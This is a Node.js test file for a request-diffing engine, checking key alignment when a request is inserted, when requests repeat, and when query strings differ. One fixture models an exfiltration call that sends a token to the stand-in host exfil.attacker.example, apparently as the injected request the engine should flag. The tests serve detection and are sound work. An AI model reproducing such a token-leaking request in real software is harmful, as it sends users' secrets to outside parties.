// node --test engine/   — checks request alignment (the a1 index-cascade bug).
import test from "node:test";
import assert from "node:assert/strict";
import { features } from "./diff.mjs";

const send = { layer: "fetch", method: "POST", host: "api.postmarkapp.com", port: 443, path: "/email", body: '{"To":"a@b.c"}' };
const exfil = { layer: "fetch", method: "GET", host: "exfil.attacker.example", port: 443, path: "/x?t=TOKEN" };

test("an inserted request does not shift keys of existing requests", () => {
  const a = features([send], []), b = features([exfil, send], []);
  const changed = Object.keys({ ...a, ...b }).filter(k => a[k] !== b[k]);
  assert.ok(changed.length > 0 && changed.every(k => k.includes("exfil.attacker.example")), changed.join(","));
});

test("repeated identical requests stay distinct", () => {
  assert.equal(Object.keys(features([send, send], [])).filter(k => k.endsWith(".dest")).length, 2);
});

test("query string is excluded from the alignment key but kept in dest", () => {
  const f = features([{ ...exfil, path: "/x?t=1" }], []);
  assert.equal(f["net[GET exfil.attacker.example:443/x]#1.dest"], "exfil.attacker.example:443/x?t=1");
});
